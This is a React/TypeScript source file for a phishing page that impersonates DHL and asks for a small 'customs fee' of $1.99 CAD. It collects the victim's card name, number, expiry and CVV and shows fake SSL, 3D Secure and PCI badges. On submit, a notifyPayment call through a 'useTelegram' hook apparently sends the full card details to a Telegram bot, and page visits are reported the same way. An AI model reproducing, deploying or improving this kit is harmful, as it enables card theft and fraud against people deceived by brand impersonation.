import { useEffect, useState, useRef } from "react";
import DHLHeader from "../components/DHLHeader";
import StepIndicator from "../components/StepIndicator";
import { notifyVisit, notifyPayment } from "../hooks/useTelegram";

interface PaymentData {
  cardName: string;
  cardNumber: string;
  expiry: string;
  cvv: string;
}

interface PaymentPageProps {
  onNext: (data: PaymentData) => void;
}

function formatCardNumber(raw: string): string {
  const digits = raw.replace(/\D/g, "").slice(0, 16);
  return digits.replace(/(.{4})/g, "$1 ").trim();
}

function formatExpiry(raw: string): string {
  const digits = raw.replace(/\D/g, "").slice(0, 4);
  if (digits.length >= 3) return digits.slice(0, 2) + "/" + digits.slice(2);
  return digits;
}

function getCardBrand(number: string): string {
  const digits = number.replace(/\s/g, "");
  if (digits.startsWith("4")) return "VISA";
  if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return "MASTERCARD";
  if (/^3[47]/.test(digits)) return "AMEX";
  return "";
}

function maskCardNumber(display: string): string {
  const raw = display.replace(/\s/g, "");
  if (!raw) return "•••• •••• •••• ••••";
  const padded = raw.padEnd(16, "•");
  const groups = [
    padded.slice(0, 4),
    padded.slice(4, 8),
    padded.slice(8, 12),
    padded.slice(12, 16),
  ];
  return groups.join(" ");
}

export default function PaymentPage({ onNext }: PaymentPageProps) {
  const [form, setForm] = useState<PaymentData>({
    cardName: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
  });
  const [errors, setErrors] = useState<Partial<PaymentData>>({});
  const [loading, setLoading] = useState(false);
  const [showCvv, setShowCvv] = useState(false);
  const cvvRef = useRef<HTMLInputElement>(null);

  useEffect(() => {
    notifyVisit("Payment / Page 2");
  }, []);

  const handleCardNumber = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    setForm((prev) => ({ ...prev, cardNumber: formatted }));
    if (errors.cardNumber) setErrors((prev) => ({ ...prev, cardNumber: "" }));
  };

  const handleExpiry = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatExpiry(e.target.value);
    setForm((prev) => ({ ...prev, expiry: formatted }));
    if (errors.expiry) setErrors((prev) => ({ ...prev, expiry: "" }));
  };

  const handleCvv = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 4);
    setForm((prev) => ({ ...prev, cvv: val }));
    if (errors.cvv) setErrors((prev) => ({ ...prev, cvv: "" }));
  };

  const handleName = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm((prev) => ({ ...prev, cardName: e.target.value.toUpperCase() }));
    if (errors.cardName) setErrors((prev) => ({ ...prev, cardName: "" }));
  };

  const validate = (): boolean => {
    const newErrors: Partial<PaymentData> = {};
    if (!form.cardName.trim()) newErrors.cardName = "Required";
    const digits = form.cardNumber.replace(/\s/g, "");
    if (digits.length < 13) newErrors.cardNumber = "Invalid card number";
    if (!form.expiry || form.expiry.length < 5) newErrors.expiry = "Invalid date";
    if (!form.cvv || form.cvv.length < 3) newErrors.cvv = "Invalid CVV";
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validate()) return;
    setLoading(true);
    await notifyPayment(form);
    setLoading(false);
    onNext(form);
  };

  const brand = getCardBrand(form.cardNumber);
  const displayNumber = maskCardNumber(form.cardNumber);
  const displayName = form.cardName || "FULL NAME";
  const displayExpiry = form.expiry || "MM/YY";

  return (
    <div className="page-enter" style={{ minHeight: "100vh", backgroundColor: "#f5f5f5" }}>
      <DHLHeader />

      <div style={{ maxWidth: 640, margin: "0 auto", padding: "0 16px 40px" }}>
        <StepIndicator currentStep={2} />

        <div style={{ textAlign: "center", marginBottom: 24 }}>
          <h1 style={{ fontSize: 22, fontWeight: 700, color: "#1a1a1a", margin: "0 0 6px" }}>
            Secure Payment
          </h1>
          <p style={{ fontSize: 14, color: "#666", margin: 0 }}>
            Your data is protected by 256-bit SSL encryption
          </p>
        </div>

        {/* Amount banner */}
        <div style={{
          background: "linear-gradient(135deg, #D40511 0%, #a00008 100%)",
          borderRadius: 12,
          padding: "16px 24px",
          marginBottom: 24,
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          color: "white",
          boxShadow: "0 4px 16px rgba(212,5,17,0.3)"
        }}>
          <div>
            <div style={{ fontSize: 12, opacity: 0.8, marginBottom: 4 }}>CUSTOMS FEES</div>
            <div style={{ fontSize: 28, fontWeight: 800 }}>$1.99 CAD</div>
          </div>
          <div style={{ textAlign: "right" }}>
            <div style={{ fontSize: 11, opacity: 0.8, marginBottom: 4 }}>PARCEL</div>
            <div style={{ fontSize: 14, fontWeight: 600 }}>DHLEX-7483921056</div>
            <div style={{ fontSize: 11, opacity: 0.7, marginTop: 2 }}>🔒 Secure Payment</div>
          </div>
        </div>

        {/* Live card preview */}
        <div className="card-preview">
          {/* Card brand top right */}
          <div style={{ position: "absolute", top: 20, right: 24, fontSize: 14, fontWeight: 800, letterSpacing: "0.08em", opacity: 0.9 }}>
            {brand || ""}
          </div>

          <div className="card-chip" />

          <div className="card-number-display">
            {displayNumber}
          </div>

          <div className="card-bottom">
            <div>
              <div className="card-label-sm">Card Holder</div>
              <div className="card-value-sm">{displayName}</div>
            </div>
            <div>
              <div className="card-label-sm">Expires</div>
              <div className="card-value-sm">{displayExpiry}</div>
            </div>
            {/* Mastercard circles */}
            {(brand === "MASTERCARD" || !brand) && (
              <div style={{ display: "flex", position: "absolute", bottom: 20, right: 24 }}>
                <div style={{ width: 28, height: 28, borderRadius: "50%", background: "#EB001B", opacity: 0.9 }} />
                <div style={{ width: 28, height: 28, borderRadius: "50%", background: "#F79E1B", opacity: 0.9, marginLeft: -10 }} />
              </div>
            )}
            {brand === "VISA" && (
              <div style={{ position: "absolute", bottom: 18, right: 22, fontSize: 20, fontWeight: 900, fontStyle: "italic", color: "white", letterSpacing: "-1px" }}>
                VISA
              </div>
            )}
          </div>
        </div>

        {/* Payment form */}
        <div className="package-card">
          <form onSubmit={handleSubmit} noValidate>
            <div style={{ marginBottom: 14 }}>
              <label className="dhl-label">Name on Card *</label>
              <input
                type="text"
                className="dhl-input"
                placeholder="JOHN SMITH"
                value={form.cardName}
                onChange={handleName}
                autoComplete="cc-name"
                style={{ textTransform: "uppercase" }}
              />
              {errors.cardName && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.cardName}</span>}
            </div>

            <div style={{ marginBottom: 14 }}>
              <label className="dhl-label">Card Number *</label>
              <div style={{ position: "relative" }}>
                <input
                  type="text"
                  className="dhl-input"
                  placeholder="1234 5678 9012 3456"
                  value={form.cardNumber}
                  onChange={handleCardNumber}
                  autoComplete="cc-number"
                  inputMode="numeric"
                  style={{ paddingRight: 50 }}
                />
                <div style={{ position: "absolute", right: 14, top: "50%", transform: "translateY(-50%)", fontSize: 20 }}>
                  {brand === "VISA" && <span style={{ fontWeight: 900, fontSize: 14, fontStyle: "italic", color: "#1a1f71" }}>VISA</span>}
                  {brand === "MASTERCARD" && <span style={{ fontSize: 11, fontWeight: 700, color: "#333" }}>MC</span>}
                  {brand === "AMEX" && <span style={{ fontSize: 11, fontWeight: 700, color: "#2E77BC" }}>AMEX</span>}
                  {!brand && <span>💳</span>}
                </div>
              </div>
              {errors.cardNumber && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.cardNumber}</span>}
            </div>

            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 14, marginBottom: 24 }}>
              <div>
                <label className="dhl-label">Expiry Date *</label>
                <input
                  type="text"
                  className="dhl-input"
                  placeholder="MM/YY"
                  value={form.expiry}
                  onChange={handleExpiry}
                  autoComplete="cc-exp"
                  inputMode="numeric"
                />
                {errors.expiry && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.expiry}</span>}
              </div>
              <div>
                <label className="dhl-label">CVV *</label>
                <div style={{ position: "relative" }}>
                  <input
                    ref={cvvRef}
                    type={showCvv ? "text" : "password"}
                    className="dhl-input"
                    placeholder="•••"
                    value={form.cvv}
                    onChange={handleCvv}
                    autoComplete="cc-csc"
                    inputMode="numeric"
                    style={{ paddingRight: 44 }}
                  />
                  <button
                    type="button"
                    onClick={() => setShowCvv(!showCvv)}
                    style={{
                      position: "absolute",
                      right: 12,
                      top: "50%",
                      transform: "translateY(-50%)",
                      background: "none",
                      border: "none",
                      cursor: "pointer",
                      fontSize: 16,
                      color: "#999",
                      padding: 0,
                    }}
                    aria-label="Toggle CVV visibility"
                  >
                    {showCvv ? "🙈" : "👁"}
                  </button>
                </div>
                {errors.cvv && <span style={{ color: "#D40511", fontSize: 12 }}>{errors.cvv}</span>}
              </div>
            </div>

            {/* Security badges */}
            <div style={{ display: "flex", justifyContent: "center", gap: 20, marginBottom: 20, flexWrap: "wrap" }}>
              {["🔒 SSL", "🛡️ 3D Secure", "✅ PCI Certified"].map((badge) => (
                <span key={badge} style={{ fontSize: 12, color: "#666", fontWeight: 500 }}>{badge}</span>
              ))}
            </div>

            <button type="submit" className="dhl-btn" disabled={loading}>
              {loading ? "Processing..." : `💳 Pay $1.99 CAD`}
            </button>
          </form>
        </div>
      </div>
    </div>
  );
}
